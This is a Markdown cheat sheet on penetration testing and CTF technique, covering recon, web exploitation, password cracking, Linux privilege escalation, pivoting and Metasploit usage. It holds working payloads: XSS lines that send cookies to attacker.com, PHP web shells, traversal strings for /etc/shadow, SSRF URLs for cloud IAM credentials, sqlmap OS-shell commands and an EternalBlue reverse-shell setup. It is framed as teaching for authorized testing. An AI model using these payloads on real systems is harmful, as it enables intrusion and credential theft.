# Offensive Security & Ethical Hacking

> Understanding offensive techniques is the foundation of strong defense. This is for authorized security testing, CTF competitions, and learning defense.

**⚠️ All techniques here are for authorized testing, CTFs, and education only. Unauthorized access is illegal.**

---

## Methodology

### Penetration Testing Phases
```
1. Reconnaissance        — Gather intel without touching target
2. Scanning/Enumeration  — Active discovery of services, vulnerabilities
3. Exploitation          — Gain initial access
4. Post-Exploitation     — Persist, escalate, pivot
5. Reporting             — Document findings with risk ratings
```

### PTES (Penetration Testing Execution Standard)
1. Pre-engagement interactions (scope, rules of engagement)
2. Intelligence gathering
3. Threat modeling
4. Vulnerability analysis
5. Exploitation
6. Post-exploitation
7. Reporting

### OWASP Testing Guide
Systematic web application security testing framework.
Coverage: information gathering, configuration, authentication, authorization, session management, injection, etc.

---

## Reconnaissance

### Passive Recon (No Direct Contact)
```bash
# DNS/WHOIS
whois example.com
dig example.com ANY
dig +short example.com MX
dig +short example.com TXT
dig -x 1.2.3.4                    # Reverse lookup

# Zone transfer (often misconfigured, leaks all DNS records)
dig axfr @ns1.example.com example.com

# Subdomain enumeration
subfinder -d example.com          # Fast passive
amass enum -passive -d example.com
theHarvester -d example.com -b all
crt.sh search for domain          # Certificate transparency

# Google dorks
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
"@example.com" site:pastebin.com   # Leaked credentials

# Shodan (internet-connected device search)
shodan search hostname:example.com
shodan search "Apache 2.4.6" port:80
shodan host 1.2.3.4

# Email harvesting
theHarvester -d example.com -b linkedin,google
```

### Active Recon (Direct Contact)
```bash
# Network scanning
nmap -sn 192.168.1.0/24           # Ping sweep (host discovery)
nmap -sV -O -p- 192.168.1.1       # Version + OS detection, all ports
nmap -sC -sV --script=vuln 192.168.1.1  # Default scripts + vuln scan
nmap -A 192.168.1.1               # Aggressive (OS, version, scripts, traceroute)
nmap -sU -p 53,67,161 192.168.1.1 # UDP scan
nmap -p 80 --open 192.168.1.0/24  # Find web servers
masscan -p80,443,8080 192.168.1.0/24 --rate=10000  # Fast port scanner

# Service enumeration
nc -nv 192.168.1.1 80             # Banner grab
telnet 192.168.1.1 80             # Simple connection
curl -Iv http://192.168.1.1       # HTTP banner

# SMB enumeration
enum4linux -a 192.168.1.1         # SMB/SAMBA enumeration
smbclient -L //192.168.1.1        # List shares
smbmap -H 192.168.1.1             # Map shares and permissions

# SNMP
snmp-check 192.168.1.1            # SNMP info
snmpwalk -c public 192.168.1.1    # Walk MIB tree

# Web enumeration
nikto -h http://target.com         # Web vuln scanner
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302
dirb http://target.com /usr/share/wordlists/dirb/common.txt
```

---

## Exploitation

### Web Application Attacks

#### SQL Injection
```bash
# Manual testing
curl "http://target.com/users?id=1'"        # Error-based detection
curl "http://target.com/users?id=1 OR 1=1"  # Boolean-based
curl "http://target.com/users?id=1; SELECT SLEEP(5)--"  # Time-based

# sqlmap (automated, authorized use only)
sqlmap -u "http://target.com/user?id=1" --dbs          # Enumerate databases
sqlmap -u "http://target.com/user?id=1" -D mydb --tables
sqlmap -u "http://target.com/user?id=1" -D mydb -T users --dump
sqlmap -u "http://target.com/" --data="username=admin&password=test" --method POST
sqlmap -u "http://target.com/user?id=1" --os-shell      # OS shell (if permissions)
sqlmap -u "http://target.com/user?id=1" --file-read=/etc/passwd
```

#### XSS (Cross-Site Scripting)
```javascript
// Basic payloads (for testing)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
<body onload=alert(1)>

// Filter bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

// Exfiltrate cookies (demonstrate impact in authorized tests)
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

#### Directory Traversal
```
../../etc/passwd
../../../etc/shadow
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc/passwd
```

#### SSRF (Server-Side Request Forgery)
```bash
# Test for SSRF in URL parameters
http://169.254.169.254/latest/meta-data/           # AWS metadata
http://169.254.169.254/latest/meta-data/iam/       # IAM credentials
http://100.100.100.200/latest/meta-data/           # Alibaba Cloud
http://169.254.169.254/computeMetadata/v1/         # GCP
http://127.0.0.1:6379/                             # Redis
http://127.0.0.1:27017/                            # MongoDB
http://internal-service/                           # Internal services
http://[::1]/admin                                 # IPv6 localhost bypass

# Bypass filters
http://0.0.0.0/
http://2130706433/                                 # Decimal IP for 127.0.0.1
http://localhost.attacker.com/                     # DNS rebinding
```

#### File Upload Attacks
```
# Bypass extension filtering
shell.php.jpg
shell.php%00.jpg
shell.pHP
shell.php5, shell.phtml, shell.shtml
shell.jpg (change Content-Type to application/php)

# Web shells
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>

# Upload JPEG with embedded PHP (if not validated by content)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### Network Attacks

#### Password Attacks
```bash
# Hydra (online brute force)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# Hashcat (offline hash cracking)
hashcat -m 0 hash.txt wordlist.txt              # MD5
hashcat -m 1000 ntlm_hashes.txt rockyou.txt    # NTLM (Windows)
hashcat -m 1800 sha512crypt.txt rockyou.txt    # sha512crypt (Linux)
hashcat -m 1800 hash.txt -a 3 ?l?l?l?l?l?l    # Mask attack
hashcat -m 1800 hash.txt -r rules/best64.rule wordlist.txt  # Rules

# John the Ripper
john --wordlist=rockyou.txt shadow.txt
john --show shadow.txt
john --format=md5 --wordlist=rockyou.txt hashes.txt
```

---

## Post-Exploitation

### Linux Privilege Escalation
```bash
# System info
uname -a && cat /etc/os-release
id && whoami && hostname
cat /etc/passwd && cat /etc/group
sudo -l   # What can we sudo?

# SUID/SGID binaries (check gtfobins.github.io)
find / -perm /4000 -type f 2>/dev/null    # SUID
find / -perm /2000 -type f 2>/dev/null    # SGID

# Writable cron jobs
ls -la /etc/cron* /var/spool/cron/
cat /etc/crontab

# Writable PATH directories
echo $PATH && ls -la $(echo $PATH | tr ':' ' ')

# Capabilities
getcap -r / 2>/dev/null

# Services running as root
ps aux | grep root
ss -tlnp | grep 127.0.0.1

# Writable files owned by root
find / -writable -user root 2>/dev/null | grep -v proc

# NFS shares (no_root_squash)
cat /etc/exports

# Kernel exploits (check CVEs for running kernel version)
uname -r
# Search: kernel_version + local privilege escalation + exploitdb

# Automated tools
linpeas.sh  # LinPEAS: thorough automated enumeration
linenum.sh  # LinEnum: another enumeration script
```

### Pivoting
```bash
# SSH tunneling (access internal services through compromised host)
# Local forward: access internal-db from your machine via compromised host
ssh -L 3306:internal-db:3306 user@compromised-host

# Dynamic proxy (SOCKS5 through compromised host)
ssh -D 1080 user@compromised-host
proxychains nmap -sT 10.0.0.0/24    # Route traffic through proxy

# Chisel (when SSH not available)
# On attack machine:
chisel server --reverse --port 8080
# On compromised host:
chisel client attack-ip:8080 R:3306:internal-db:3306
```

---

## CTF Techniques

### Web Challenges
```bash
# Always check
curl -I http://target/    # Response headers
view-source:http://target/  # Page source
http://target/robots.txt
http://target/.git/         # Exposed git repos
http://target/.env          # Exposed env files
http://target/phpinfo.php
http://target/backup/       # Common backup paths

# JWT manipulation
# Decode: base64url decode header + payload
# Try: change algorithm to "none", remove signature
# Try: brute force weak HMAC secret

# IDOR (Insecure Direct Object Reference)
# Change ID parameters: /api/users/1 → /api/users/2
# Try: negative IDs, large IDs, UUID pattern changes
```

### Binary/Reversing
```bash
# Initial analysis
file binary             # ELF, PE, type
strings binary          # Printable strings
xxd binary | head       # Hex dump
objdump -d binary       # Disassemble
readelf -h binary       # ELF headers

# Dynamic analysis
strace ./binary         # System calls
ltrace ./binary         # Library calls
gdb ./binary            # Debugger
gdb -x script.gdb binary  # GDB with script

# GDB commands
run [args]
break *0x401234         # Breakpoint at address
break main              # Breakpoint at function
info break              # List breakpoints
continue / step / next
x/10x $rsp              # Examine 10 hex words at RSP
disassemble main        # Disassemble function
info registers          # Register values
```

### Cryptography Challenges
```python
# Common patterns to recognize
# Base64: a-zA-Z0-9+/=
import base64
base64.b64decode(b"SGVsbG8=")  # b"Hello"

# ROT13
import codecs
codecs.decode("Uryyb", "rot13")  # "Hello"

# Caesar cipher brute force
def caesar_brute(ciphertext):
    for shift in range(26):
        plain = "".join(chr((ord(c) - ord('A') + shift) % 26 + ord('A'))
                        if c.isalpha() else c
                        for c in ciphertext.upper())
        print(f"Shift {shift}: {plain}")

# XOR (common in CTFs)
encrypted = bytes([0x41, 0x42, 0x43])
key = 0x13
decrypted = bytes([b ^ key for b in encrypted])

# Frequency analysis for substitution ciphers
from collections import Counter
Counter(ciphertext).most_common(10)
# Compare to English: ETAOINSHRDLU...

# Common hash identification
# 32 chars = MD5
# 40 chars = SHA1
# 64 chars = SHA256
# Start with $2a$, $2b$ = bcrypt
```

### Steganography
```bash
# Image steganography
strings image.png | head -50        # Strings in image
xxd image.png | grep -A1 "IEND"    # Data after PNG end
binwalk image.png                   # Find embedded files
binwalk -e image.png                # Extract embedded files
zsteg image.png                     # LSB steganography (requires gem)
steghide extract -sf image.jpg      # Extract hidden data

# Audio steganography
# Open in Audacity, view spectrogram
# Look for patterns in spectrogram view
```

---

## Security Tools Reference

### Burp Suite (Web App Testing)
```
Proxy: Intercept browser requests
Repeater: Modify and replay individual requests
Intruder: Automated attack (fuzzing, brute force)
Scanner: Automated vulnerability scanner
Decoder: Encode/decode payloads
Comparer: Diff two requests/responses
Sequencer: Analyze token randomness
```

### Metasploit Framework
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue    # EternalBlue (WannaCry)
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
run

# Meterpreter commands
sysinfo, getuid, getpid
ps                        # List processes
migrate [PID]             # Migrate to process
hashdump                  # Dump password hashes
upload / download
shell                     # Spawn shell
```

---

*The best pentesters think like attackers. Learn to think like the adversary — then you can actually stop them.*
